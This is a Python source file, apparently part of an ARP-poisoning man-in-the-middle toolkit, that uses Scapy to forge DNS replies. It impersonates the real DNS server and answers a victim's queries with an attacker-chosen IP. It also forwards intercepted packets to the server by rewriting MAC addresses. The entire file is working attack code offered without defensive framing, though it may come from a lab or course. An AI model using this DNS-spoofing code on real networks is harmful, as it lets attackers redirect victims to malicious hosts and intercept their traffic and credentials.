from scapy.all import *
from scapy.layers.inet import TCP, IP, ICMP, UDP
from scapy.layers.dns import DNS, DNSQR, DNSRR
from scapy.layers.l2 import *
# import pcap
import help_functions
from log_helpers import *
from firewall import *
from arp_poison import client_ip, server_ip, local_ip, get_ip_from_url

custom_ip = get_ip_from_url()


def get_man_in_middle_filter():
    return "(dst host {}) and (src host {})".format(server_ip, client_ip)


def get_man_in_middle_answer_filter():
    return "(dst host {}) and (src host {})".format(client_ip, server_ip)


def spf_pkt(pk):
    sp_pkt = IP(src=server_ip, dst=pk[IP].src) \
               / UDP(dport=pk[UDP].sport, sport=53) \
               / DNS(id=pk[DNS].id, qr=1, opcode=pk[DNS].opcode,
                     aa=1, rd=0, qdcount=pk[DNS].qdcount, ancount=1, nscount=1,
                     qd=DNSQR(qname=pk[DNSQR].qname),
                     an=DNSRR(rrname=pk[DNSQR].qname, ttl=86400, rdata=custom_ip),
                     ns=DNSRR(rrname=pk[DNSQR].qname, type=2, rdata=custom_ip),
                     ar=DNSRR(rrname=pk[DNSQR].qname, rdata=custom_ip))
    return sp_pkt


def send_custom_dns_response(pk):
    """send custom dns response back to the target"""

    # spf_resp = IP(dst=pk[IP].src) \
    #     / UDP(dport=pk[UDP].sport, sport=53) \
    #     / DNS(id=pk[DNS].id, qr=1, qdcount=1, ancount=1, qd=DNSQR(pk[DNSQR]),
    #           an=DNSRR(rrname=pk[DNSQR].qname, ttl=30, rdata=local_ip))
    spf_resp = spf_pkt(pk)

    send(spf_resp, verbose=0)


def forward_pkt_to_server(pk):
    """pass pkt destined to server"""

    server_mac = getmacbyip(server_ip)
    pk[Ether].dst = server_mac
    if ARP in pk:
        pk[ARP].hwdst = server_mac
    print("pk changed: ")
    # pk.show()
    send(pk)
